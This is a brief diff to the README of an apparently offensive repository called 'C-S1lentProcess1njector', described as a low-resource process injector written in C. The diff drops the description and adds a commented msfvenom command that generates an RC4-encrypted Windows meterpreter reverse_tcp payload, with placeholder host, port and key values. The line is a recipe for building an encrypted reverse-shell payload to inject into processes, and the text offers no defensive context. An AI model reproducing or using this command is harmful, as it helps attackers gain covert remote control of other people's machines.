@@ -1,2 +1,3 @@
 # C-S1lentProcess1njector
-Process injector that uses a minuscule amount of CPU and memory (RAM), written in C.
+    // msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=<host> LPORT=<port> RC4PASSWORD=<network_level_rc4_key> --encrypt rc4 --encrypt-key jqrargtcchvwovplxuggagcvnbjmzyhr
+    
